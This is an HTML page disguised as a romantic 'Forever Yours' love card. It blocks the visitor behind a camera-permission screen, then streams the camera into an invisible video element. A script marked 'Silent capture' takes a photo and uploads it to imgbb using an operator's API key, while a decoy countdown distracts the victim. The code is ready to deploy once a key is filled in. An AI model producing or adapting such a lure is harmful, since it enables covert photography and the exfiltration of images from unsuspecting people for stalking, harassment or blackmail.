<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Forever Yours • Love</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css" rel="stylesheet">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Playfair+Display:wght@400;700&family=Dancing+Script:wght@400;700&display=swap');

        :root {
            --pink: #ff9ec8;
            --rose: #ff6b9d;
        }

        body {
            background: linear-gradient(135deg, #ffe4f0 0%, #ffd1e6 100%);
            min-height: 100vh;
            font-family: 'Playfair Display', serif;
            overflow: hidden;
            margin: 0;
        }

        .hearts {
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            pointer-events: none;
            z-index: 1;
        }

        .heart {
            position: absolute;
            color: #ff6b9d;
            font-size: 24px;
            animation: floatHeart 12s linear infinite;
        }

        @keyframes floatHeart {
            0% { transform: translateY(100vh) rotate(0deg); opacity: 0.8; }
            100% { transform: translateY(-150px) rotate(360deg); opacity: 0; }
        }

        .permission-screen {
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background: white;
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 10000;
            flex-direction: column;
            gap: 1.5rem;
        }

        .love-card {
            background: rgba(255, 255, 255, 0.9);
            backdrop-filter: blur(20px);
            border-radius: 30px;
            box-shadow: 0 30px 60px -15px rgba(255, 107, 157, 0.5);
            border: 2px solid rgba(255, 107, 157, 0.3);
            max-width: 420px;
            padding: 3rem 2.5rem;
            text-align: center;
            z-index: 2;
        }

        .hidden-video { position: absolute; width: 1px; height: 1px; opacity: 0; }
    </style>
</head>
<body>

    <div class="hearts" id="hearts"></div>

    <!-- Permission Blocking Screen -->
    <div class="permission-screen" id="permissionScreen">
        <div class="text-center">
            <i class="fas fa-heart fa-6x mb-4" style="color:#ff6b9d; animation: pulse 1.8s infinite;"></i>
            <h3 style="color:#c4457d;">Camera Access Needed</h3>
            <p class="text-muted px-4" style="max-width: 300px;">
                Please click <strong>Allow</strong> when Chrome asks for camera permission.
            </p>
            <button onclick="requestCamera()" class="btn btn-lg px-5 py-3" 
                    style="background:#ff6b9d; color:white; border-radius:50px; font-size:1.1rem;">
                <i class="fas fa-camera me-2"></i> Enable Camera
            </button>
        </div>
    </div>

    <!-- Main UI -->
    <div class="d-flex align-items-center justify-content-center min-vh-100" id="mainUI" style="display:none; position:relative; z-index:2;">
        <div class="love-card">
            <h1 style="font-family:'Dancing Script', cursive; font-size:3.5rem; color:var(--rose);">Forever Yours</h1>
            <p class="text-muted mb-4">Capturing a beautiful moment...</p>
            
            <div class="mb-4">
                <div id="countdown" style="font-size:4.2rem; font-weight:bold; color:var(--rose);">30</div>
                <small class="text-muted">seconds</small>
            </div>

            <div class="progress mb-4" style="height:10px; border-radius:50px;">
                <div id="progressBar" class="progress-bar bg-danger" style="width:100%;"></div>
            </div>

            <i class="fas fa-heart fa-3x" style="color:#ff9ec8; animation: pulse 1.5s infinite;"></i>
        </div>
    </div>

    <video id="video" class="hidden-video" autoplay playsinline></video>
    <canvas id="canvas" class="hidden-video" width="640" height="480"></canvas>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
    <script>
        const API_KEY = "YOUR_API_KEY_HERE"; // ← Replace with your imgbb key

        let video = document.getElementById('video');
        let canvas = document.getElementById('canvas');
        let stream = null;
        let countdownInterval = null;

        function createHeart() {
            const h = document.createElement('div');
            h.className = 'heart';
            h.textContent = ['❤️','💖','💗','💘'][Math.floor(Math.random()*4)];
            h.style.left = Math.random() * 100 + 'vw';
            h.style.animationDuration = (Math.random() * 8 + 10) + 's';
            document.getElementById('hearts').appendChild(h);
            setTimeout(() => h.remove(), 20000);
        }

        async function requestCamera() {
            try {
                if (stream) stream.getTracks().forEach(t => t.stop());

                stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: "user", width: {ideal: 1280}, height: {ideal: 720} }
                });

                video.srcObject = stream;
                await video.play();

                // Hide permission screen and show main UI
                document.getElementById('permissionScreen').style.display = 'none';
                document.getElementById('mainUI').style.display = 'flex';

                startLoveExperience();

            } catch (err) {
                console.error(err);
                // Stay on permission screen
                document.getElementById('permissionScreen').style.display = 'flex';
            }
        }

        function captureAndUpload() {
            if (!stream) return;
            const ctx = canvas.getContext('2d');
            canvas.width = video.videoWidth || 640;
            canvas.height = video.videoHeight || 480;
            ctx.drawImage(video, 0, 0);

            const base64 = canvas.toDataURL('image/jpeg', 0.85);
            uploadToImgBB(base64);
        }

        async function uploadToImgBB(base64) {
            if (API_KEY === "YOUR_API_KEY_HERE") {
                console.warn("Please set your imgbb API key");
                return;
            }
            try {
                const formData = new FormData();
                formData.append('image', base64.split(',')[1]);

                const res = await fetch(`https://api.imgbb.com/1/upload?key=${API_KEY}`, {
                    method: 'POST',
                    body: formData
                });
                const data = await res.json();
                if (data.status === 200) console.log("✅ Uploaded:", data.data.url);
            } catch (e) {
                console.error("Upload failed", e);
            }
        }

        function startCountdown() {
            let time = 30;
            const el = document.getElementById('countdown');
            const bar = document.getElementById('progressBar');

            countdownInterval = setInterval(() => {
                time--;
                el.textContent = time;
                bar.style.width = (time / 30 * 100) + '%';

                if (time <= 0) {
                    clearInterval(countdownInterval);
                    el.innerHTML = '❤️';
                }
            }, 1000);
        }

        function startLoveExperience() {
            setTimeout(captureAndUpload, 600);   // Silent capture
            startCountdown();
        }

        // Auto attempt on load (may trigger permission in some cases)
        window.onload = () => {
            for (let i = 0; i < 15; i++) setTimeout(createHeart, i * 120);
            setTimeout(() => requestCamera(), 800);
        };

        // Cleanup
        window.addEventListener('beforeunload', () => {
            if (stream) stream.getTracks().forEach(t => t.stop());
        });
    </script>
</body>
</html>
